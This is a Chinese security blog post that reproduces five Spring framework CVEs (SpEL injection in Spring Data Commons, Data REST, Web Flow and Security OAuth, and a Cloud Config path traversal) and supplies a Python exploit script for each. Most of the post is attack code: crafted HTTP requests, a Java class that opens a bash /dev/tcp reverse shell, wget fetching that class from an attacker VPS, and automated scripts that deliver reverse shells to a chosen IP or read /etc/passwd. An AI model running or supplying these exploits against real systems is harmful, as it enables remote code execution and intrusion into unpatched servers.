> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/sDkM1scxGOrroYGs4e6JFQ)

> 本来是自己写在有道云笔记的，存粹是为了练习下 python 代码，也懒得打码了就是自己搭建的个漏测环境 (借用下 yicunyiye 师傅的服务器。现在服务器已经被删除)

### 0x01 cve-2018-1273

#### 1.1 漏洞检测

访问目标`/users?page=&size=5`

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0hiaiaeYSP3VlFPicjpdibK5qlETt5rWt1cr4Ah57UEexZ0mrncA21HqROA/640?wx_fmt=png)

抓包，修改 post 包

```
POST /users?page=&size=5 HTTP/1.1Host: 49.235.54.135:24814User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Content-Type: application/x-www-form-urlencodedContent-Length: 121Origin: http://49.235.54.135:24814Connection: closeReferer: http://49.235.54.135:24814//usersUpgrade-Insecure-Requests: 1username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch root/test")]=&password=&repeatedPassword=
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0uiaj8qrhHGpUbDRllVYyNUR2uUVYrk0EcBsPOjA2e22ZB92pLPN7Yyw/640?wx_fmt=png)

进入 docker 查看是否创建成功

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0a44N8jvZHw5foIR7D7ds7XD8PgUyrlh5DHDR5UDPZvjYgicJt8VeuYg/640?wx_fmt=png)

#### 1.2 反弹 shell

这里我们先编译一个 class 文件

Exploit.java

```
public class Exploit{    public Exploit(){        try{            Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/目标IP/2222 0>&1");        }catch(Exception e){            e.printStackTrace();        }    }    public static void main(String[] argv){        Exploit e = new Exploit();    }}
```

然后反编译下 java 文件

```
javac Exploit.java
```

然后再 vps 上传 class 文件再开启 web

```
python3 -m http.server 8080
```

然后再 bp 里面执行下载该 class 文件

```
POST /users?page=&size=5 HTTP/1.1Host: 49.235.54.135:24814User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Content-Type: application/x-www-form-urlencodedContent-Length: 149Origin: http://49.235.54.135:24814Connection: closeReferer: http://49.235.54.135:24814//usersUpgrade-Insecure-Requests: 1username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("wget http://198.13.51.45:8080/Exploit.class")]=&password=&repeatedPassword=
```

然后我们再 vps 上面监听 2222 端口

```
nc -lvvp 2222
```

然后再 bp 执行

```
POST /users?page=&size=5 HTTP/1.1Host: 49.235.54.135:24814User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Content-Type: application/x-www-form-urlencodedContent-Length: 118Origin: http://49.235.54.135:24814Connection: closeReferer: http://49.235.54.135:24814//usersUpgrade-Insecure-Requests: 1username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("java Exploit")]=&password=&repeatedPassword=
```

反弹 shell 成功

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0QOhPGHMAyuZSMicGB3wqE9CkNWkAfgL7MOLOLiaYlqID6t3ibhIu3kFYA/640?wx_fmt=png)

#### 1.3 cve-2018-1273 poc 编写

Spring 在自动解析用户参数时候使用了`SpelExpressionParser` 来解析`propertyName`

MapDataBinder.java

```
Expression expression = PARSER.parseExpression(propertyName);  PropertyPath leafProperty = getPropertyPath(propertyName).getLeafProperty();  TypeInformation<?> owningType = leafProperty.getOwningType();  TypeInformation<?> propertyType = owningType.getProperty(leafProperty.getSegment());  propertyType = propertyName.endsWith("]") ? propertyType.getActualType() : propertyType;  if (conversionRequired(value, propertyType.getType())) {    PropertyDescriptor descriptor = BeanUtils        .getPropertyDescriptor(owningType.getType(), leafProperty.getSegment());    MethodParameter methodParameter = new MethodParameter(descriptor.getReadMethod(), -1);    TypeDescriptor typeDescriptor = TypeDescriptor.nested(methodParameter, 0);    value = conversionService.convert(value, TypeDescriptor.forObject(value), typeDescriptor);  }  expression.setValue(context, value);
```

`ProxyingHandlerMethodArgumentResolver`在拿到参数的时候会创建一个`MapDataBinder`来解析参数`MapDataBinder.bind()`方法，会连带进行`doBind`操作，最终会调用到 `setPropertyValue` 方法来，最后在 `expression.setValue(context, value)` 的时候触发了漏洞

**使用说明**

准备好 class 文件

Exploit.java

```
public class Exploit{    public Exploit(){        try{            Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/目标IP/2222 0>&1");        }catch(Exception e){            e.printStackTrace();        }    }    public static void main(String[] argv){        Exploit e = new Exploit();    }}
```

然后反编译下 java 文件

```
javac Exploit.java
```

然后再 vps 上传 class 文件再开启 web

```
python3 -m http.server 8080
```

这里 url 为`http://198.13.51.45:8080/Exploit.class`

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl014ic2YgyywD9ibw0TcEO7Ht1D4yiaGPpB8jdp2qEA1dtBPDia1xCQc7GicQ/640?wx_fmt=png)

vps 监听，这里监听端口为编译的 class 的端口

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0lZEvU5Vpib0RgaCjfe42fWfGFibibgyJObKNbibPDdn1BOrDiaA3WhWZicOA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0C2sOs8D8zyCZZBPUh08pbv1icDQcASL64eEECd4qvSTdjWKncbzCUvA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0Px4LhaHy5n7Lc2vQ6ia4FxEARYAs1ibf2RJTgya6tEMbmoGZLjxic10Rw/640?wx_fmt=png)

```
import pyfigletimport requestsascii_banner = pyfiglet.figlet_format("CVE-2018-1273")print(ascii_banner)print("blog:https://www.cnblogs.com/yicunyiye/")print("-" * 50)payload_poc = {    'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch root/test111")]':'',    'password':'',    'repeatedPassword':''}url = input("attack url:")print("-" * 50)# url = "http://49.235.54.135:24814//users?page=&size=5"target = url+ "/users?page=&size=5"try:    res = requests.post(target,data=payload_poc)    if(res.status_code == 500):        print("[+]%s is vulnerable" % url)        print("-" * 50)        class_url = input("your exp class url:")        cmd = "wget "+class_url        payload_class = {            'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("' +cmd+ '")]': '',            'password': '',            'repeatedPassword': ''        }        res_upload = requests.post(target,data=payload_class)        if(res_upload.status_code == 500):            print("[+]upload success")            print("-" * 50)            print("在vps监听端口，执行之后输入1继续，否则跳出程序")            flag = input("请在监听后输入1:")            print("-" * 50)            flag = int(flag)            if(flag == 1):                payload_shell = {                    'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("java Exploit")]': '',                    'password': '',                    'repeatedPassword': ''                }                res_shell = requests.post(target,data=payload_shell)                if(res_shell.status_code == 500):                    print("[+]反弹成功")                else:                    print("[-]反弹失败")            else:                exit(0)        else:            print("[-]upload fail")            print("-" * 50)    else:        print("[-]%s is not vulnerable" % url)except:    print("[-]%s is not vulnerable" % url)
```

### 0x02 CVE-2017-8046

#### 2.1 漏洞复现

访问存在漏洞 web

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0nv3j0QMmKibpX6YgD0Eia7q2OiaLLjt4QvgZlnMVGAFDbib3gicprASHp6w/640?wx_fmt=png)

访问 / persons 目录

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0qk6AsQLh1ia0kKUHGHUgP4vewM6vN2KzHAvHngibUmT82s45eCDGhI3A/640?wx_fmt=png)

post 添加一个用户

```
{"firstName":"test","lastName":"test"}
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0fMphLxYkXnlVGnXCwLjUDhgAAaQ1N2lohPGRTwWrXZs4t2BCTBZvHw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0JFlS7m08BQ1leNWQFadKR0LUiaz5GpvP4mr29w3EwSr56pBytI1XDIw/640?wx_fmt=png)

可以看到 id 为 1，在 persons 目录里面，使用 PATCH 方法尝试修改`lastName` 在 http 头里面添加

```
Content-Type': 'application/json-patch+json
```

PATCH 修改内容为

```
[{"op":"replace","path":"/lastName","value":"hacker"}]
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0xQORvWBFzHMbGdzibnFM0n0XPSFib1trIM5C4O01eh6ibXEYqialgmSUBg/640?wx_fmt=png)

可以看到修改成功

如果要执行命令，需要转化为二进制执行, 例如使用如下 python 代码：

```
cmd = input("please input your command：")cmd = bytes(cmd, encoding='utf-8')bytecode = ','.join(str(i) for i in list(cmd))please input your command：touch /test116,111,117,99,104,32,47,116,101,115,116
```

然后使用 exp：

```
[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,101,115,116}))/lastname", "value": "vulhub" }]
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0tzFSyASqZFgjTI8xgtKfiaorZaXdxxmI4QtJx9y16JG9sdP3eJp6Iew/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0q10piauwg3apglBgeOVNibDicbdibdCCzsIr6Bnkaibl2CgQnBxib5GiccN5A/640?wx_fmt=png)

执行成功

反弹 shell 查看 python 代码，同样的操作，只是需要进行一个 base64 bash 编码

#### 2.2 CVE-2017-8046 编写 poc

这里输入获取到的 url 地址

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0NHdyfyBU3TAq5zdx42v8hOPK82hhs4ibR3GicicayLyj6dia4R3NZxibiceA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0uDZXFAenSzdSgx2wbRUxvF7nrOemfQpyjTr3eoCZwnaEqPjIwSyVCw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl02718nRTaoJ60D0eowRqRiarkLiclW3cVFtlKx5ib4EJTOe6sSQ4NGMOiaA/640?wx_fmt=png)

在 vps 监听

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl01fCevaPVxiagyjd0RxGpT9DMQu929bWSGDhDl8viaFVkW6FJE0ibjTXow/640?wx_fmt=png)

在 exp 输入 shell

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0AydGgzgum9fovNeS73jJxCzo5ER3r2XMdbBBvImNWZRZGAp8KBshVw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0S2ZBGIN6ydBKfGRLFW6cIZAr5zzyic1NFMMQhpM9fBaMKABWc5XMbEw/640?wx_fmt=png)

```
import requestsimport jsonimport pyfigletimport base64import timeimport reascii_banner = pyfiglet.figlet_format("CVE-2017-8046")print(ascii_banner)print("blog:https://www.cnblogs.com/yicunyiye/")print("-" * 50)url = input("attack url:")resp_url = requests.get(url)target_text = resp_url.textprint("-" * 50)re_target = re.compile('"href" : "(.*?)"',re.I|re.S)target = re_target.findall(target_text)[0]once = requests.get(target)once = once.textprint(once)print("-" * 50)print("输入json中任意两个键来创建值，比如firstname，lastname")first = input("first:")second = input("second:")# first = "lastname"# second = "firstname"create = {    first:"yicunyiye",    second:"hacker"}if('hacker' not in once):    poc1 = requests.post(target,json=create)once = requests.get(target)once = once.texttime.sleep(2)print("-" * 50)#匹配创建的用户信息的url地址re_target_once = re.compile('"hacker"(.*?)"profile"',re.I|re.S)result_once = re_target_once.findall(once)result_once = result_once[0]# input("111:")re_target_twice = re.compile('"href" : "(.*?)"',re.I|re.S)result_twice = re_target_twice.findall(result_once)json_url = result_twice[0]# json_url = input("输入json中的href地址：")# json_url = "http://49.235.54.135:47507/persons/1"replace_url = requests.patch(json_url,                     data=json.dumps([{"op": "replace", "path": "/"+first+"", "value": "fenghuaxueyue"}]),                     headers={'Content-Type': 'application/json-patch+json'})replace_url = replace_url.textif('fenghuaxueyue' in replace_url):    print("[+]%s is vulnerable" % url)print("-" * 50)print("input exit will break,input shell you can get a shell")# cmd = "touch /tmp/test"# print("please input your command："+cmd)while True:    cmd = input("please input your command：")    cmd = bytes(cmd, encoding='utf-8')    flag = b'exit'    if cmd == flag:        print("bye~~")        break    bytecode = ','.join(str(i) for i in list(cmd))    exp_url = requests.patch(json_url,                         data=json.dumps([{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{"+bytecode+"}))/lastname", "value": "yicunyiye" }]),                         headers={'Content-Type': 'application/json-patch+json'})    if cmd == b'shell':        reverse_ip = input('reverse ip：')        reverse_port = input('reverse port：')        bash_cmd = "bash -i >& /dev/tcp/" + reverse_ip + "/"+reverse_port+" 0>&1"        base64_cmd = base64.b64encode(bytes(bash_cmd, encoding='utf-8'))        string_bash = str(base64_cmd,'utf-8')        reverse_cmd = "bash -c {echo," + string_bash + "}|{base64,-d}|{bash,-i}"        poc = bytes(reverse_cmd, encoding='utf-8')        poc_code = ','.join(str(i) for i in list(poc))        exp = requests.patch(json_url,                                 data=json.dumps([{"op": "replace",                                                   "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{" + poc_code + "}))/lastname",                                                   "value": "vulhub"}]),                                 headers={'Content-Type': 'application/json-patch+json'})        print("[+]getshell success")
```

### 0x03 cve-2017-4971

#### 3.1 漏洞复现

使用左边账号登录

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0LSjecl7xHKc1cREy8ny3darZATVqJqGoNpRdbbVVI4C4Hy6JOoJEdw/640?wx_fmt=png)

进去了访问 / hotels/1

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0vf8WXicPVZxB9kjTDaukvHusCKwswqLRpSibgBL6Wgq8s4ppXdURKKng/640?wx_fmt=png)

随便输入信息然后点击

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0vBjTZ4icKoPfUhic0MsSQCcMMuicJibSau0FvwBfj4pPfXvyCwZicxTRXjw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0xV9Yh9EpzVTO3xaAWkMZrqiagtWhut42zozXjRc9u1RR4rk4hTutibLA/640?wx_fmt=png)

添加 payload

```
&_(new+java.lang.ProcessBuilder("bash","-c","bash+-i+>%26+/dev/tcp/攻击机IP/端口号+0>%261")).start()=yicunyiye
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0t8jUyzzDQ6poTpGKc8KLUiaCLy4OgTtegB7gI10zeGl8DN6mZib3hkHQ/640?wx_fmt=png)

#### 3.2 cve-2017-4971 poc 编写

这里需要注意下就是登录以及后面的 post 数据包都采用了 csrf_token，只需要用 request.Session() 固定下就，然后 post 前先 get url 正则匹配下 token 就行了

注意 python 编译器把空格变成 +，我就在这里搞了好久 --，结果发现被转义了

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0M0L9wfgaUxYmQ1zj6ibnN5CVq3k2iczzlLP2jG5rQGbuQrhoQI93icUicQ/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0eLeEaHDP7crjJCiadrYTAicJXSAJIVhwTib0iaxGzateV8z8G8Yfx2AXOA/640?wx_fmt=png)

```
import requestsimport reimport timeimport pyfigletimport datetimeascii_banner = pyfiglet.figlet_format("CVE-2017-4971")print(ascii_banner)print("blog:https://www.cnblogs.com/yicunyiye/")print("-" * 50)#用户登录时候的url# url = input("attack url：")url = "http://49.235.54.135:24924/"print("-" * 50)Post_login_url = url + "/loginProcess"#输入账号密码print("default:keith,erwin,jeremy,scott")# username = input("username:")username = "keith"print("default:melbourne,leuven,atlanta,rochester")# password = input("password:")password = "melbourne"#用户登录时候需要的csrf_tokensession = requests.Session()login_csrf_url = url + '/login'res_login = session.get(login_csrf_url)re_login_csrf = re.compile('(.*?)"',re.I|re.S)login_token = re_login_csrf.findall(res_login.text)[0]#登录login_data = {    "username":username,    "password":password,    "_csrf":login_token}login = session.post(Post_login_url,data=login_data,allow_redirects=False)try:    login_flag = str(login.headers)    if('JSESSIONID' in login_flag):        print("-" * 50)        print("[+]login success!")        print("-" * 50)        response = session.get(url+'/hotels/1')        Location = session.get(url+'/hotels/booking?hotelId=1',allow_redirects=False)        Location = Location.headers['Location']        #填写hotel信息的url        hotel_info_url = url+Location        hotel_page = session.get(hotel_info_url)        re_post_csrf = re.compile('(.*?)"', re.I | re.S)        post_token = re_post_csrf.findall(hotel_page.text)[0]        today_add_1 = (datetime.datetime.now() + datetime.timedelta(days=1)).strftime("%m-%d-%Y")        today_reduce_1 = (datetime.datetime.now() + datetime.timedelta(days=-1)).strftime("%m-%d-%Y")        today_add_3 = (datetime.datetime.now() + datetime.timedelta(days=3)).strftime("%m-%d-%Y")        post_data = {            "checkinDate": today_add_1,            "checkoutDate": today_add_1,            "beds": "1",            "smoking": "false",            "_amenities": "on",            "_amenities": "on",            "_amenities": "on",            "creditCard": "1231111111111111",            "creditCardName": "11",            "creditCardExpiryMonth": "1",            "creditCardExpiryYear": "1",            "_csrf": post_token,            "_eventId_proceed": "_eventId_proceed",            "ajaxSource": "proceed"        }        Spring_Redirec_URL = session.post(hotel_info_url,data=post_data)        Spring_Redirec_URL = Spring_Redirec_URL.headers['Spring-Redirect-URL']        confirm_url = url + Spring_Redirec_URL        # res = session.get(confirm_url)        reverse_ip = input("reverse ip:")        reverse_port = input("reverse port:")        confirm_data = {            '_eventId_confirm':'',            '_csrf':post_token,            '_(new java.lang.ProcessBuilder("bash","-c","bash -i >& /dev/tcp/'+reverse_ip+'/'+reverse_port+' 0>&1")).start()':'yicunyiye'        }        res = session.get(confirm_url)        time.sleep(2)        payload_send = session.post(confirm_url,data=confirm_data,allow_redirects=False)        if(payload_send.status_code == 500):            print("[+]反弹shell成功!")            print("-" * 50)        else:            print("[-]反弹shell失败!")            print("-" * 50)    else:        print("-" * 50)        print("[-]login failed!")        print("-" * 50)except:    print("bye~~")
```

### 0x04 CVE-2016-4977

#### 4.1 CVE-2016-4977 poc 编写

```
import requestsimport pyfigletimport base64import timeascii_banner = pyfiglet.figlet_format("CVE-2016-4977")print(ascii_banner)print("blog:https://www.cnblogs.com/yicunyiye/")print("-" * 50)url = input("attack url:")username = input("username:")password = input("password:")print("-" * 50)data = username+":"+passwordres = base64.b64encode(data.encode("utf-8")).decode("utf-8")Authorization = "Basic " + resheaders = {    "Authorization": Authorization    }payload = "oauth/authorize?response_type=${11*11}&client_id=acme&scope=openid&redirect_uri=http://test"target = url+payloadres = requests.get(target,headers=headers)result = res.textif('121' in result):    print("[+]%s is vulnerable" % url)    print("-" * 50)    reverse_ip = input('reverse ip：')    reverse_port = input('reverse port：')    bash_cmd = "bash -i >& /dev/tcp/" + reverse_ip + "/" + reverse_port + " 0>&1"    base64_cmd = base64.b64encode(bytes(bash_cmd, encoding='utf-8'))    string_bash = str(base64_cmd, 'utf-8')    reverse_cmd = "bash -c {echo," + string_bash + "}|{base64,-d}|{bash,-i}"    poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(reverse_cmd[0])    for ch in reverse_cmd[1:]:        poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch)    poc += ')}'    payload_getshell = "oauth/authorize?response_type="+poc+"&client_id=acme&scope=openid&redirect_uri=http://test"    # print(payload_getshell)    target_getshell = url + payload_getshell    shell = requests.get(target_getshell,headers=headers)    time.sleep(10)    print("getshell success!")else:    print("[-]%s is not vulnerable" % url)    print("-" * 50)
```

### 0x05 CVE-2020-5410

#### 5.1 CVE-2020-5410 poc 编写

```
import requestsimport pyfigletascii_banner = pyfiglet.figlet_format("CVE-2020-5410")print(ascii_banner)print("blog:https://www.cnblogs.com/yicunyiye/")print("-" * 50)url = input("attack url:")payload = "/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23/ddd"result = requests.get(url+payload)if ('root' in result.text):    print("[+]%s is vulnerable" % url)else:    print("[-]%s is not vulnerable" % url)
```

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)

**推荐阅读：**

本月报名可以参加抽奖送 Kali NetHunter 手机的优惠活动  

[![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvouibfico2qhUHkxIvX2u13s7zzLMaFdWAhC1MTl3xzjjPth3bLibSZtzN9KGsEWibPgYw55Lkm5VuKthibQ/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247497897&idx=1&sn=5801b91d451b4c253eb3e2c5ff220673&chksm=ec1cad96db6b2480ce0be49a377819558c06b29603b812512b7cb52ca0c123bc444764f11502&scene=21#wechat_redirect)

**点赞，转发，在看**

原创投稿作者：11ccaab

未经授权，禁止转载

![](https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif)